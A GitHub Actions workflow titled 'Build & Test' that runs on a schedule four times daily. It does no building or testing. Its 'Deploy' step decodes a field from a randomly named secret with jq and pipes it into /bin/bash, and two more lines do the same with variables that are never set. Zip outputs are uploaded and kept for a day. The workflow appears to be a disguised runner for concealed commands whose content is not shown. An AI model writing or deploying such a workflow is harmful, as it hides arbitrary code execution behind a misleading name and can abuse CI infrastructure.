name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '29 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Deploy
        env:
          tzjns89: ${{ secrets.tzjns89 }}
        run: |
          printf '%s' "$tzjns89" | jq -r .tk931 | /bin/bash
          printf '%s' "$vrmwj1" | jq -r .ublq431 | /bin/bash
          echo $tctsb5 | jq -r .vyu9437 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: hVNlGRgC
          path: "*.zip"
          retention-days: 1
